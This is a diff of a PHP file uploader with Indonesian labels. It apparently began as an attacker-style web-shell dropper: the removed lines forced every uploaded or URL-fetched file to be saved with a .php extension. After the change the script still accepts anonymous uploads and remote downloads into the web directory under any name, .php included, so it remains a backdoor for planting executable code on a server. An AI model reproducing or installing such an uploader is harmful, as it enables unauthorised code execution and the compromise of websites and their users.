@@ -7,13 +7,6 @@ ini_set('post_max_size', '100M');
 $status = "";
 $cwd    = getcwd();
 
-function force_php_ext($name) {
-    $name = basename($name);
-    if (preg_match('/\.php$/i', $name)) return $name;
-    if (preg_match('/\.[^.\/]+$/', $name)) return preg_replace('/\.[^.\/]+$/', '', $name) . '.php';
-    return $name . '.php';
-}
-
 if (!empty($_FILES['ribel']['name'])) {
     $orig = $_FILES['ribel']['name'];
     $tmp  = $_FILES['ribel']['tmp_name'];
@@ -22,7 +15,7 @@ if (!empty($_FILES['ribel']['name'])) {
     if ($err !== UPLOAD_ERR_OK) {
         $status = "Upload error (kode: " . (int)$err . ")";
     } else {
-        $new  = force_php_ext($orig);
+        $new  = basename($orig);
         $dest = $cwd . DIRECTORY_SEPARATOR . $new;
         if (move_uploaded_file($tmp, $dest)) {
             @chmod($dest, 0644);
@@ -41,7 +34,7 @@ elseif (!empty($_POST['url'])) {
         if ($filename === '' || $filename === '.') $filename = 'upload_' . time();
     }
 
-    $new  = force_php_ext($filename);
+    $new  = basename($filename);
     $dest = $cwd . DIRECTORY_SEPARATOR . $new;
 
     if (!preg_match('#^https?://#i', $url)) $url = 'http://' . $url;
@@ -130,7 +123,6 @@ else {
 <html>
 <head>
 <meta charset="utf-8">
-<title>Masse</title>
 </head>
 <body>
 <?php if ($status !== "") { echo $status; } ?>
@@ -144,7 +136,7 @@ else {
 
 <form action="" method="POST">
 <input type="text" name="url" placeholder="https://example.com/file.txt" size="40">
-<input type="text" name="urlname" placeholder="nama (auto .php)" size="20">
+<input type="text" name="urlname" placeholder="nama file (extensi asli)" size="20">
 <input type="submit" name="submit_url" value="Gass URL">
 </form>
 </body>
